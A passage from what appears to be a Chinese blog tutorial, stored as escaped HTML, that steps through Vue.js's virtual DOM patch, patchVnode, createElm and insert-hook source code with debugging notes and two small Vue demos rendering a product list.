    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; reset by the hot-reload-api and we need to do a proper re-render.&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (isTrue(vnode.isStatic) &amp;amp;&amp;amp;&lt;span&gt;
      isTrue(oldVnode.isStatic) &lt;/span&gt;&amp;amp;&amp;amp;&lt;span&gt;
      vnode.key &lt;/span&gt;=== oldVnode.key &amp;amp;&amp;amp;&lt;span&gt;
      (isTrue(vnode.isCloned) &lt;/span&gt;||&lt;span&gt; isTrue(vnode.isOnce))
    ) {
      vnode.componentInstance &lt;/span&gt;=&lt;span&gt; oldVnode.componentInstance
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
    }

    let i
    const data &lt;/span&gt;=&lt;span&gt; vnode.data
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(data) &amp;amp;&amp;amp; isDef(i = data.hook) &amp;amp;&amp;amp; isDef(i =&lt;span&gt; i.prepatch)) {
      i(oldVnode, vnode)
    }

    const oldCh &lt;/span&gt;=&lt;span&gt; oldVnode.children
    const ch &lt;/span&gt;=&lt;span&gt; vnode.children
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(data) &amp;amp;&amp;amp;&lt;span&gt; isPatchable(vnode)) {
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (i = 0; i &amp;lt; cbs.update.length; ++&lt;span&gt;i) cbs.update[i](oldVnode, vnode)
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(i = data.hook) &amp;amp;&amp;amp; isDef(i =&lt;span&gt; i.update)) i(oldVnode, vnode)
    }
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isUndef(vnode.text)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(oldCh) &amp;amp;&amp;amp;&lt;span&gt; isDef(ch)) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (oldCh !==&lt;span&gt; ch) updateChildren(elm, oldCh, ch, insertedVnodeQueue, removeOnly)
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(ch)) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (process.env.NODE_ENV !== 'production'&lt;span&gt;) {
          checkDuplicateKeys(ch)
        }
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(oldVnode.text)) nodeOps.setTextContent(elm, ''&lt;span&gt;)
        addVnodes(elm, &lt;/span&gt;&lt;span&gt;null&lt;/span&gt;, ch, 0, ch.length - 1&lt;span&gt;, insertedVnodeQueue)
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(oldCh)) {
        removeVnodes(elm, oldCh, &lt;/span&gt;0, oldCh.length - 1&lt;span&gt;)
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(oldVnode.text)) {
        nodeOps.setTextContent(elm, &lt;/span&gt;''&lt;span&gt;)
      }
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (oldVnode.text !==&lt;span&gt; vnode.text) {
      nodeOps.setTextContent(elm, vnode.text)
    }
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(data)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(i = data.hook) &amp;amp;&amp;amp; isDef(i =&lt;span&gt; i.postpatch)) i(oldVnode, vnode)
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;invokeInsertHook&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; invokeInsertHook (vnode, queue, initial) {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; delay insert hooks for component root nodes, invoke them after the&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; element is really inserted&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (isTrue(initial) &amp;amp;&amp;amp;&lt;span&gt; isDef(vnode.parent)) {
      vnode.parent.data.pendingInsert &lt;/span&gt;=&lt;span&gt; queue
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (let i = 0; i &amp;lt; queue.length; ++&lt;span&gt;i) {
        queue[i].data.hook.insert(queue[i])
      }
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;assertNodeMatch&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; assertNodeMatch (node, vnode, inVPre) {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(vnode.tag)) {
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; vnode.tag.indexOf('vue-component') === 0 ||&lt;span&gt; (
        &lt;/span&gt;!isUnknownElement(vnode, inVPre) &amp;amp;&amp;amp;&lt;span&gt;
        vnode.tag.toLowerCase() &lt;/span&gt;=== (node.tagName &amp;amp;&amp;amp;&lt;span&gt; node.tagName.toLowerCase())
      )
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; node.nodeType === (vnode.isComment ? 8 : 3&lt;span&gt;)
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;pre&gt;
核心函数patch&lt;br/&gt;首先，通过示例给patch函数打断点，我们看到第一个参数是div#app dom元素，第二个参数是包含div#app信息的vnode。第一部分的代码并没有进入if语句
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isUndef(vnode)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(oldVnode)) invokeDestroyHook(oldVnode)
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
    }

    let isInitialPatch &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;
    const insertedVnodeQueue &lt;/span&gt;= []
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;第二部分由于oldNode已经定义所以分支语句进入else分支。else分支首先处理如果oldVnode是元素的一些操作。然后createElm创建元素。第三，如果存在父元素，对祖先元素遍历，那么对祖先元素注册钩子函数，否则世界registerRef。 &lt;span class=&quot;cnblogs_code&quot;&gt;ancestor = ancestor.parent&lt;/span&gt; 是while循环的条件。接下来删除旧的节点。第四，invokeInsertHook。最后返回vnode的dom元素。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;56&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if&lt;/span&gt; (isUndef(oldVnode)){}&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;dom元素的nodeType为1，所以isDef返回true&lt;/span&gt;
   const isRealElement =&lt;span&gt; isDef(oldVnode.nodeType)
      
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!isRealElement &amp;amp;&amp;amp;&lt;span&gt; sameVnode(oldVnode, vnode)) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; patch existing root node&lt;/span&gt;
        patchVnode(oldVnode, vnode, insertedVnodeQueue, &lt;span&gt;null&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;, removeOnly)
      }
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;!isRealElement为false，进入else分支&lt;/span&gt;
 &lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isRealElement) {
          &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; mounting to a real element&lt;/span&gt;
          &lt;span&gt;//&lt;/span&gt;&lt;span&gt; check if this is server-rendered content and if we can perform&lt;/span&gt;
          &lt;span&gt;//&lt;/span&gt;&lt;span&gt; a successful hydration.&lt;/span&gt;
          &lt;span&gt;//&lt;/span&gt;&lt;span&gt;根据var SSR_ATTR = 'data-server-rendered'，我们看到如果是服务端渲染&lt;/span&gt;
          &lt;span&gt;//&lt;/span&gt;&lt;span&gt;那么元素移除掉SSR-ATTR属性，并且hydrating设置为true&lt;/span&gt;
          &lt;span&gt;if&lt;/span&gt; (oldVnode.nodeType === 1 &amp;amp;&amp;amp;&lt;span&gt; oldVnode.hasAttribute(SSR_ATTR)) {
            oldVnode.removeAttribute(SSR_ATTR)
            hydrating &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;
          }
          &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果我们要设置hydrating，那么就插入钩子函数&lt;/span&gt;
          &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isTrue(hydrating)) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (hydrate(oldVnode, vnode, insertedVnodeQueue)) {
              invokeInsertHook(vnode, insertedVnodeQueue, &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;)
              &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; oldVnode
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (process.env.NODE_ENV !== 'production'&lt;span&gt;) {
              warn(
                &lt;/span&gt;'The client-side rendered virtual DOM tree is not matching ' +
                'server-rendered content. This is likely caused by incorrect ' +
                'HTML markup, for example nesting block-level elements inside ' +
                '&amp;lt;p&amp;gt;, or missing &amp;lt;tbody&amp;gt;. Bailing hydration and performing ' +
                'full client-side render.'&lt;span&gt;
              )
            }
          }
          &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; either not server-rendered, or hydration failed.&lt;/span&gt;
          &lt;span&gt;//&lt;/span&gt;&lt;span&gt; create an empty node and replace it&lt;/span&gt;
          &lt;span&gt;//&lt;/span&gt;&lt;span&gt;emptyNodeAt将oldVnode包装一下&lt;/span&gt;
          oldVnode =&lt;span&gt; emptyNodeAt(oldVnode)
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; replacing existing element&lt;/span&gt;
        const oldElm =&lt;span&gt; oldVnode.elm
        const parentElm &lt;/span&gt;=&lt;span&gt; nodeOps.parentNode(oldElm)

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建新节点create new node&lt;/span&gt;
&lt;span&gt;        createElm(
          vnode,
          insertedVnodeQueue,
          &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; extremely rare edge case: do not insert if old element is in a&lt;/span&gt;
          &lt;span&gt;//&lt;/span&gt;&lt;span&gt; leaving transition. Only happens when combining transition +&lt;/span&gt;
          &lt;span&gt;//&lt;/span&gt;&lt;span&gt; keep-alive + HOCs. (#4590)&lt;/span&gt;
          oldElm._leaveCb ? &lt;span&gt;null&lt;/span&gt;&lt;span&gt; : parentElm,
          nodeOps.nextSibling(oldElm)
        )

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; update parent placeholder node element, recursively&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(vnode.parent)) {
          let ancestor &lt;/span&gt;=&lt;span&gt; vnode.parent
          const patchable &lt;/span&gt;=&lt;span&gt; isPatchable(vnode)
          &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (ancestor) {
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (let i = 0; i &amp;lt; cbs.destroy.length; ++&lt;span&gt;i) {
              cbs.destroy[i](ancestor)
            }
            ancestor.elm &lt;/span&gt;=&lt;span&gt; vnode.elm
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (patchable) {
              &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (let i = 0; i &amp;lt; cbs.create.length; ++&lt;span&gt;i) {
                cbs.create[i](emptyNode, ancestor)
              }
              &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; #6513&lt;/span&gt;
              &lt;span&gt;//&lt;/span&gt;&lt;span&gt; invoke insert hooks that may have been merged by create hooks.&lt;/span&gt;
              &lt;span&gt;//&lt;/span&gt;&lt;span&gt; e.g. for directives that uses the &quot;inserted&quot; hook.&lt;/span&gt;
              const insert =&lt;span&gt; ancestor.data.hook.insert
              &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (insert.merged) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; start at index 1 to avoid re-invoking component mounted hook&lt;/span&gt;
                &lt;span&gt;for&lt;/span&gt; (let i = 1; i &amp;lt; insert.fns.length; i++&lt;span&gt;) {
                  insert.fns[i]()
                }
              }
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
              registerRef(ancestor)
            }
            ancestor &lt;/span&gt;=&lt;span&gt; ancestor.parent
          }
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; destroy old node&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(parentElm)) {
          removeVnodes(parentElm, [oldVnode], &lt;/span&gt;0, 0&lt;span&gt;)
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(oldVnode.tag)) {
          invokeDestroyHook(oldVnode)
        }
      }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;document&quot; readability=&quot;10&quot;&gt;

&lt;p class=&quot;paragraph text-align-type-left pap-line-1.3 pap-line-rule-auto pap-spacing-before-0pt pap-spacing-after-0pt&quot;&gt;虚拟DOM并不能改变DOM操作本身很慢的情况，它通过对象模拟DOM节点，它的优化点有两个部分&lt;/p&gt;
&lt;ol start=&quot;1&quot; readability=&quot;-0.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p class=&quot;paragraph text-align-type-left pap-line-1.3 pap-line-rule-auto pap-spacing-before-0pt pap-spacing-after-0pt pap-hanging-indent-2em&quot;&gt;初始化文档结构时，先js构建出一个真实的DOM结构，然后再插入文档。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p class=&quot;paragraph text-align-type-left pap-line-1.3 pap-line-rule-auto pap-spacing-before-0pt pap-spacing-after-0pt pap-hanging-indent-2em&quot;&gt;更新试图时，将新旧节点树比较计算出最小变更然后再映射到真实的DOM中。这在大量、频繁的更新数据时有很大的优势。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p class=&quot;paragraph text-align-type-left pap-line-1.3 pap-line-rule-auto pap-spacing-before-0pt pap-spacing-after-0pt&quot;&gt;这也是patch函数的功能。&lt;/p&gt;
&lt;p class=&quot;paragraph text-align-type-left pap-line-1.3 pap-line-rule-auto pap-spacing-before-0pt pap-spacing-after-0pt&quot;&gt;DEMO1.初次渲染&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html &lt;/span&gt;&lt;span&gt;lang&lt;/span&gt;&lt;span&gt;=&quot;en&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;vue初次渲染&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;src&lt;/span&gt;&lt;span&gt;=&quot;js/vue.js&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;app&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;span&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;{{obj}}&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;span&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
        el:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        data:{
                obj:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;012&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        },
        created:&lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(){
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.obj&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;567&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        },
        methods:{
           addName(){
               &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.obj2&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.obj2&lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;456&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
           }
        }
    })
&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们把vue.js打断点。&lt;/p&gt;
&lt;p&gt;首先在function lifecycleMixin 中调用 &lt;span class=&quot;cnblogs_code&quot;&gt;vm.$el = vm.__patch__(vm.$el, vnode, hydrating, false /* removeOnly */);&lt;/span&gt; &lt;/p&gt;
&lt;p&gt;其中  &lt;span class=&quot;cnblogs_code&quot;&gt;Vue.prototype.__patch__ = inBrowser ? patch : noop;&lt;/span&gt; 目前我们只考虑浏览器有DOM的情况。vm.$el就是div#app节点，vnode是div#app包装成的虚拟节点。&lt;/p&gt;
&lt;p&gt;然后执行patch函数，&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt; if (isUndef(vnode)) {
        if (isDef(oldVnode)) { invokeDestroyHook(oldVnode); }
        return
      }

      var isInitialPatch = false;
      var insertedVnodeQueue = [];

      if (isUndef(oldVnode)) {
        // empty mount (likely as component), create new root element
        isInitialPatch = true;
        createElm(vnode, insertedVnodeQueue);
      } 
//这些逻辑都不会进入&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;由于oldNode参数是div#app，它是真正的元素节点，emptyNodeAt之后什么变化呢？它将dom节点变成虚拟节点。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isRealElement) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;SSR渲染的逻辑略过。&lt;/span&gt;
            oldVnode =&lt;span&gt; emptyNodeAt(oldVnode);
          
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后createElm，这个函数的核心代码是 &lt;span class=&quot;cnblogs_code&quot;&gt;insert(parentElm, vnode.elm, refElm)&lt;/span&gt; 那么我们的节点vnode.elm就插入了DOM中。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
          &lt;span&gt;var&lt;/span&gt; oldElm =&lt;span&gt; oldVnode.elm;
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; parentElm =&lt;span&gt; nodeOps.parentNode(oldElm);

          &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; create new node创建新节点&lt;/span&gt;
&lt;span&gt;          createElm(
            vnode,
            insertedVnodeQueue,
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; extremely rare edge case: do not insert if old element is in a&lt;/span&gt;
            &lt;span&gt;//&lt;/span&gt;&lt;span&gt; leaving transition. Only happens when combining transition +&lt;/span&gt;
            &lt;span&gt;//&lt;/span&gt;&lt;span&gt; keep-alive + HOCs. (#4590)&lt;/span&gt;
            oldElm._leaveCb ? &lt;span&gt;null&lt;/span&gt;&lt;span&gt; : parentElm,
            nodeOps.nextSibling(oldElm)
          );&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; insert (parent, elm, ref) {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(parent)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(ref)) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (nodeOps.parentNode(ref) ===&lt;span&gt; parent) {

          nodeOps.insertBefore(parent, elm, ref)
        }
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        nodeOps.appendChild(parent, elm)
      }
    }
  }
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;通过insertBefore或者appendChild添加元素&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 由于vue项目挂载的节点的parent为undefined，所以 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;if&lt;/span&gt; (isDef(vnode.parent)) {&lt;/span&gt; 为false不进入。&lt;/p&gt;
&lt;p&gt; 然后挂载的节点的父元素是body，存在即true，那么删除旧的节点。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(parentElm)) {
removeVnodes(parentElm, [oldVnode], &lt;/span&gt;0, 0&lt;span&gt;)
        } &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;为什么要删除旧的节点？&lt;/p&gt;
&lt;p&gt;因为createElm加入的节点是与虚拟DOM关联的节点，浏览器本身还有渲染节点的。从图示打断点，当运行到removeVnodes时，这个时候还未删除就出现了两行元素。当我们运行完所有代码后才能显示正常结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200327185945940-1636378014.png&quot; alt=&quot;&quot; width=&quot;920&quot; height=&quot;330&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 正常结果图示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200327190141721-1560235345.png&quot; alt=&quot;&quot; width=&quot;213&quot; height=&quot;60&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 最后 &lt;span class=&quot;cnblogs_code&quot;&gt;invokeInsertHook(vnode, insertedVnodeQueue, isInitialPatch)&lt;/span&gt; 将队列中的钩子函数插入到队列的hook中。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; invokeInsertHook (vnode, queue, initial) {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; delay insert hooks for component root nodes, invoke them after the&lt;/span&gt;
      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; element is really inserted&lt;/span&gt;
      &lt;span&gt;if&lt;/span&gt; (isTrue(initial) &amp;amp;&amp;amp;&lt;span&gt; isDef(vnode.parent)) {
        vnode.parent.data.pendingInsert &lt;/span&gt;=&lt;span&gt; queue;
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; i = 0; i &amp;lt; queue.length; ++&lt;span&gt;i) {
          queue[i].data.hook.insert(queue[i]);
        }
      }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;DEMO2.&lt;/p&gt;
&lt;p&gt;需求是我们要展示一个个产品列表，而且我们这个DEMO使用模块化开发的方式。我们首先来看一看初次渲染的情况。&lt;/p&gt;
&lt;p&gt;先上代码。目录结构是vue官方脚手架。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330115802738-601832995.png&quot; alt=&quot;&quot; width=&quot;263&quot; height=&quot;341&quot;/&gt;&lt;/p&gt;


&lt;p&gt; 核心代码是&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;App.vue&lt;/span&gt;
&amp;lt;template&amp;gt;
  &amp;lt;div&amp;gt;
    &amp;lt;img src=&quot;./assets/logo.png&quot;&amp;gt;
    &amp;lt;ul&amp;gt;
      &amp;lt;li v-&lt;span&gt;for&lt;/span&gt;=&quot;item in items&quot;&amp;gt;&lt;span&gt;
        {{ item.message }}&lt;/span&gt;---&lt;span&gt;{{item.id}}
      &lt;/span&gt;&amp;lt;/li&amp;gt;
    &amp;lt;/ul&amp;gt;
    &amp;lt;!--&amp;lt;router-view/&amp;gt;--&amp;gt;
  &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;&lt;span&gt;
  import  Vue from &lt;/span&gt;&quot;vue&quot;&lt;span&gt;
export &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt; {
  name: &lt;/span&gt;'App'&lt;span&gt;,

  data(){
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;{
      items:[
        {id:&lt;/span&gt;1101,message:&quot;VERSACE范思哲&quot;&lt;span&gt;},
        {id:&lt;/span&gt;1102,message:&quot;GUCCI古驰男士经典蜜蜂刺绣&quot;&lt;span&gt;},
        {id:&lt;/span&gt;1103,message:&quot;BURBERRY巴宝莉男士休闲长袖衬衫&quot;&lt;span&gt;},
        {id:&lt;/span&gt;1104,message:&quot;BALLY巴利奢侈品男包&quot;&lt;span&gt;},
        {id:&lt;/span&gt;1105,message:&quot;FERRAGAMO菲拉格慕男款休闲皮鞋&quot;&lt;span&gt;}
      ]
    }
  },
  methods:{
  }
}
&lt;/span&gt;&amp;lt;/script&amp;gt;

&amp;lt;style&amp;gt;&lt;span&gt;
#app {
  font&lt;/span&gt;-family: 'Avenir', Helvetica, Arial, sans-&lt;span&gt;serif;
  &lt;/span&gt;-webkit-font-&lt;span&gt;smoothing: antialiased;
  &lt;/span&gt;-moz-osx-font-&lt;span&gt;smoothing: grayscale;
  text&lt;/span&gt;-&lt;span&gt;align: center;
  color: #2c3e50;
  margin&lt;/span&gt;-&lt;span&gt;top: 60px;
}
  li{
    list&lt;/span&gt;-&lt;span&gt;style: none;
  }
&lt;/span&gt;&amp;lt;/style&amp;gt;
